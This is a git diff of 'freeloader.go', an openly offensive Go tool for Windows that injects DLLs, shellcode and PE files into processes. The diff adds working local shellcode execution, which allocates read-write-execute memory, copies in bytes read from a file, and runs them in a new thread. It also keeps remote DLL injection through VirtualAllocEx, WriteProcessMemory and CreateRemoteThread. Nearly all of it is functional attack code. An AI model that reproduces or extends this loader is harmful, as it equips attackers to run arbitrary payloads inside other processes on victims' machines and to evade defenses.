@@ -3,13 +3,13 @@ package main
 /*  @saulpanders
 *	freeloader.go: General purpose DLL, PE & Shellcode injection
 *	inspired by syringe: https://github.com/securestate/syringe
-*	using https://github.com/golang/go/wiki/WindowsDLLs for pinvoke help
+*	using https://github.com/golang/go/wiki/WindowsDLLs for "pinvoke" help
 
-	implement dll injection (local & remote process) - use reflection?
+	implement dll injection (local & remote process) - use loadlibrary & reflection
 	implement shellcode injection (local & remote process)
 	implement pe injection (remote process)
 
-	Working remote DLL injection 12/19/21
+	Working remote & local DLL injection w/ loadlibrary + dll path 12/19/21
 
 	powershell to hunt for PID:
 
@@ -19,6 +19,7 @@ package main
 import (
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"syscall"
 	"unsafe"
 )
@@ -28,6 +29,7 @@ func abort(funcname string, err error) {
 }
 
 var (
+	ntdll, _           = syscall.LoadLibrary("ntdll.dll")
 	kernel32, _        = syscall.LoadLibrary("kernel32.dll")
 	getModuleHandle, _ = syscall.GetProcAddress(kernel32, "GetModuleHandleW")
 
@@ -38,11 +40,13 @@ var (
 	virtualAlloc, _       = syscall.GetProcAddress(kernel32, "VirtualAlloc")
 	virtualAllocEx, _     = syscall.GetProcAddress(kernel32, "VirtualAllocEx")
 	writeProcessMemory, _ = syscall.GetProcAddress(kernel32, "WriteProcessMemory")
+	rtlCopyMemory, _      = syscall.GetProcAddress(ntdll, "RtlCopyMemory")
 
-	createRemoteThreadEx, _ = syscall.GetProcAddress(kernel32, "CreateRemoteThread")
-	//createThread, _       = syscall.GetProcAddress(kernel32, "CreateThread")
+	createRemoteThread, _ = syscall.GetProcAddress(kernel32, "CreateRemoteThread")
+	createThread, _       = syscall.GetProcAddress(kernel32, "CreateThread")
 
-	closeHandle, _ = syscall.GetProcAddress(kernel32, "CloseHandle")
+	closeHandle, _         = syscall.GetProcAddress(kernel32, "CloseHandle")
+	waitForSingleObject, _ = syscall.GetProcAddress(kernel32, "WaitForSingleObject")
 
 	/*
 		WaitForSingleObject
@@ -66,7 +70,8 @@ const (
 
 	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)
 
-	PAGE_READWRITE = 0x04
+	PAGE_READWRITE         = 0x04
+	PAGE_EXECUTE_READWRITE = 0x40
 )
 
 //"Pinvoke" definitions
@@ -86,9 +91,31 @@ func GetModuleHandle() (handle uintptr) {
 func OpenProcess(access uintptr, inhereth uintptr, pid uintptr) (handle uintptr) {
 	var nargs uintptr = 3
 	if ret, _, callErr := syscall.Syscall(uintptr(openProcess), nargs, access, inhereth, pid); callErr != 0 {
-		abort("Call OpenProcess", callErr)
+		abort("[!] Call OpenProcess", callErr)
 	} else {
 		handle = ret
+	}
+	return
+}
+
+//RtlCopyMemory
+func RtlCopyMemory(destination uintptr, source uintptr, size int) (address uintptr) {
+	var nargs uintptr = 3
+	if ret, _, callErr := syscall.Syscall(uintptr(rtlCopyMemory), nargs, destination, source, uintptr(size)); callErr != 0 {
+		abort("[!] Call RtlCopyMemory", callErr)
+	} else {
+		address = ret
+	}
+	return
+}
+
+//virtualAlloc
+func VirtualAlloc(lpAddress uintptr, size int, flAllocationType int, flProtect int, extra uintptr, extra2 uintptr) (address uintptr) {
+	var nargs uintptr = 4
+	if ret, _, callErr := syscall.Syscall6(uintptr(virtualAlloc), nargs, lpAddress, uintptr(size), uintptr(flAllocationType), uintptr(flProtect), extra, extra2); callErr != 0 {
+		abort("[!] Call VirtualAlloc", callErr)
+	} else {
+		address = ret
 	}
 	return
 }
@@ -97,7 +124,7 @@ func OpenProcess(access uintptr, inhereth uintptr, pid uintptr) (handle uintptr)
 func VirtualAllocEx(hProc uintptr, lpAddress uintptr, size int, flAllocationType int, flProtect int, extra uintptr) (address uintptr) {
 	var nargs uintptr = 5
 	if ret, _, callErr := syscall.Syscall6(uintptr(virtualAllocEx), nargs, uintptr(hProc), uintptr(lpAddress), uintptr(size), uintptr(flAllocationType), uintptr(flProtect), extra); callErr != 0 {
-		abort("Call VirtualAllocEx", callErr)
+		abort("[!] Call VirtualAllocEx", callErr)
 	} else {
 		address = ret
 	}
@@ -108,9 +135,20 @@ func VirtualAllocEx(hProc uintptr, lpAddress uintptr, size int, flAllocationType
 func WriteProcessMemory(hProc uintptr, lpBaseAddress uintptr, lpBuffer uintptr, size int, lpNumBytesWrote int, extra uintptr) (success uintptr) {
 	var nargs uintptr = 5
 	if ret, _, callErr := syscall.Syscall6(uintptr(writeProcessMemory), nargs, uintptr(hProc), uintptr(lpBaseAddress), uintptr(lpBuffer), uintptr(size), uintptr(lpNumBytesWrote), extra); callErr != 0 {
-		abort("Call WriteProcessMemory", callErr)
+		abort("[!] Call WriteProcessMemory", callErr)
 	} else {
 		success = ret
+	}
+	return
+}
+
+//CreateThread
+func CreateThread(lpSecurityAttributes uintptr, size int, lpStartAddress uintptr, lpParameter uintptr, flags int, extra uintptr) (handle uintptr) {
+	var nargs uintptr = 5
+	if ret, _, callErr := syscall.Syscall6(uintptr(createThread), nargs, lpSecurityAttributes, uintptr(size), lpStartAddress, lpParameter, uintptr(flags), extra); callErr != 0 {
+		abort("[!] Call CreateThread", callErr)
+	} else {
+		handle = ret
 	}
 	return
 }
@@ -118,8 +156,8 @@ func WriteProcessMemory(hProc uintptr, lpBaseAddress uintptr, lpBuffer uintptr, 
 //CreateRemoteThread
 func CreateRemoteThread(hProc uintptr, lpSecurityAttributes uintptr, size int, lpStartAddress uintptr, lpParameter uintptr, flags int) (handle uintptr) {
 	var nargs uintptr = 6
-	if ret, _, callErr := syscall.Syscall6(uintptr(createRemoteThreadEx), nargs, hProc, lpSecurityAttributes, uintptr(size), lpStartAddress, lpParameter, uintptr(flags)); callErr != 0 {
-		abort("Call CreateRemoteThreadEx", callErr)
+	if ret, _, callErr := syscall.Syscall6(uintptr(createRemoteThread), nargs, hProc, lpSecurityAttributes, uintptr(size), lpStartAddress, lpParameter, uintptr(flags)); callErr != 0 {
+		abort("[!] Call CreateRemoteThread", callErr)
 	} else {
 		handle = ret
 	}
@@ -128,8 +166,17 @@ func CreateRemoteThread(hProc uintptr, lpSecurityAttributes uintptr, size int, l
 
 func CloseHandle(handle uintptr, extra1 uintptr, extra2 uintptr) (success uintptr) {
 	var nargs uintptr = 1
-	if ret, _, callErr := syscall.Syscall(uintptr(createRemoteThreadEx), nargs, handle, extra1, extra2); callErr != 0 {
-		abort("Call CloseHandle", callErr)
+	if ret, _, callErr := syscall.Syscall(uintptr(closeHandle), nargs, handle, extra1, extra2); callErr != 0 {
+		abort("[!] Call CloseHandle", callErr)
+	} else {
+		success = ret
+	}
+	return
+}
+func WaitForSingleObject(hThread uintptr, timeout int, extra uintptr) (success uintptr) {
+	var nargs uintptr = 2
+	if ret, _, callErr := syscall.Syscall(uintptr(waitForSingleObject), nargs, hThread, uintptr(timeout), extra); callErr != 0 {
+		abort("[!] Call WaitForSingleObject", callErr)
 	} else {
 		success = ret
 	}
@@ -168,7 +215,29 @@ func InjectDLL(pDll string, dwProcessID int) {
 //working local DLL injection!
 func LoadDLL(pDll string) {
 
-	_, _ = syscall.LoadLibrary(pDll)
+	_, errLoadLibrary := syscall.LoadLibrary(pDll)
+	if errLoadLibrary != nil {
+		abort("[!] Call LoadLibrary", errLoadLibrary)
+	}
+}
+
+func InjectShellcode(shellcode []byte, dwProcessID int) {
+	fmt.Println("todo")
+}
+
+// working local shellcode injection!
+func ExecuteShellcode(shellcode []byte) {
+
+	pBuff := VirtualAlloc(0, len(shellcode), MEM_PERMISSIONS, PAGE_EXECUTE_READWRITE, 0, 0)
+	_ = RtlCopyMemory(pBuff, (uintptr)(unsafe.Pointer(&shellcode[0])), len(shellcode))
+	hThread := CreateThread(0, 0, pBuff, 0, 0, 0)
+	event := WaitForSingleObject(hThread, 0xFFFFFFFF, 0)
+	fmt.Println(fmt.Sprintf("[+]WaitForSingleObject returned with %d", event))
+
+}
+
+func InjectPE(pPE string, dwProcessID int) {
+	fmt.Println("todo")
 }
 
 //main etc.
@@ -180,7 +249,9 @@ func main() {
 	flag.Parse()
 	fmt.Println(pid)
 
-	LoadDLL(*dll)
+	data, _ := ioutil.ReadFile(*dll)
+	ExecuteShellcode(data)
+	//LoadDLL(*dll)
 	//InjectDLL(*dll, *pid)
 
 }
